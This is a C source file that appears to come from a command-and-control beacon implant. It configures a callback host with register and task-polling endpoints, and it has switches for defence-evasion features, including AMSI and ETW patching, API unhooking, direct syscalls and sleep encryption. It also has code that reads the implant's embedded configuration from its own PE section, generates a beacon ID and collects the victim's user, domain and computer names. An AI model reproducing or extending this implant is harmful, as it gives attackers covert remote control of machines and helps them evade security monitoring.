#include "pch.h"
#include "api.h"
#include "utils.h"
#include "beacon.h"

extern API g_Api;
extern PCHAR g_lpId;
extern PWCHAR g_lpwId;
extern HMODULE g_hModule;

BOOL UnpackProfile(
    PPROFILE g_Profile
)
{

    g_Profile->lpwHost = L"192.168.43.248";
    g_Profile->lpwUserAgent = L"useragent";
    g_Profile->lpwRegister = L"/register";
    g_Profile->lpwPoll = L"/tasks";
    g_Profile->dwCallbackTimeout = 60000;
    g_Profile->dwSleepTime = 1;

    g_Profile->bUnHook = FALSE;
    g_Profile->bSyscalls = FALSE;
    g_Profile->bEncryptSleep = FALSE;
    g_Profile->bPatchAmsi = FALSE;
    g_Profile->bPatchEtw = FALSE;
    g_Profile->bCleanSleep = FALSE;

    return TRUE;

    PBYTE pbBase = (PBYTE)g_hModule, pbPtr = pbBase;

    if (!pbPtr || *(WORD*)pbPtr != 'ZM')
    {
        return FALSE;
    }

    pbPtr = pbBase + *(DWORD*)(pbPtr + 0x3c);

    if (*(DWORD*)pbPtr != 'EP')
    {
        return FALSE;
    }

    WORD wSections = *(WORD*)(pbPtr + 0x06);
    WORD OptionalHeaderSize = *(WORD*)(pbPtr + 0x14);

    PIMAGE_SECTION_HEADER Section = NULL;
    PIMAGE_SECTION_HEADER Sections = (PIMAGE_SECTION_HEADER)(pbPtr + 0x18 + OptionalHeaderSize);

    for (INT i = 0; i < wSections; i++)
    {
        if (!memcmp( Sections->Name, SECTION_NAME, sizeof(SECTION_NAME) - 1 ))
        {
            Section = Sections;
            break;
        }

        Sections++;
    }

    if (!Section)
    {
        return FALSE;
    }

    PBYTE pbData = (PBYTE)pbBase + Section->VirtualAddress;
    DWORD dwData = Section->SizeOfRawData;

    if (!dwData)
    {
        return FALSE;
    }

    DWORD dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwHost = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwUserAgent = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwRegister = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwPoll = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    g_Profile->dwCallbackTimeout = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->dwSleepTime = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bUnHook = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bSyscalls = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bEncryptSleep = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bPatchAmsi = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bPatchEtw = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bCleanSleep = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    return TRUE;
}

BOOL GenerateId() {
    DWORD dwLen = 32;
    CHAR pCharset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    g_lpId = HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwLen + 1
    );

    if (!g_lpId)
    {
        return FALSE;
    }

    srand(
        time( NULL )
    );

    for (DWORD dwIter = 0; dwIter < dwLen; dwIter++)
    {
        INT iKey = rand() % (int) (sizeof pCharset - 1);
        g_lpId[dwIter] = pCharset[iKey];
    }

    g_lpId[dwLen] = '\0';

    g_lpwId = HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwLen * 4
    );

    if (!g_lpwId)
    {
        return FALSE;
    }

    SIZE_T stRet = mbstowcs(
        g_lpwId,
        g_lpId,
        dwLen
    );

    if (stRet == -1)
    {
        return FALSE;
    }

    // HeapFree(
    //     GetProcessHeap(),
    //     lpTmp,
    //     NULL
    // );

    return TRUE;
}

BOOL GetLogonFromToken (
    HANDLE hToken,
    PCHAR lpName,
    PCHAR lpDomain
)
{

    #define MAX_NAME 256

    DWORD dwLength  = 0;
    BOOL bSuccess   = FALSE;
    PTOKEN_USER ptu = NULL;
    DWORD dwSize    = MAX_NAME;

    if (NULL == hToken)
    {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, (LPVOID) ptu, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            return FALSE;
        }

        ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);

        if (ptu == NULL)
        {
            return FALSE;
        }
    }

    if (!GetTokenInformation(hToken, TokenUser, (LPVOID) ptu, dwLength, &dwLength))
    {
      return FALSE;
    }

    SID_NAME_USE SidType;

    if( !LookupAccountSidA( NULL , ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType ) )
    {
        DWORD dwResult = GetLastError();

        if(dwResult == ERROR_NONE_MAPPED)
        {
            strcpy (lpName, "NONE_MAPPED" );
        } else
        {
            return FALSE;
        }
    } else
    {
        bSuccess = TRUE;
    }

   return bSuccess;
}

BOOL GetBasicUserInfo(
    PCHAR lpcUserName,
    PCHAR lpcDomainName,
    PCHAR lpsComputerName
)
{
    HANDLE hHeap, hToken = NULL;
    DWORD  dwCompBufLen  = MAX_PATH;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    if (!GetLogonFromToken(hToken, lpcUserName, lpcDomainName))
    {
        return FALSE;
    }

    if (!GetComputerNameA(lpsComputerName, &dwCompBufLen))
    {
        return FALSE;
    }

    if (strcmp(lpsComputerName, lpcDomainName) == 0)
    {
        strcpy(lpcDomainName, " ");
    }

    return TRUE;
}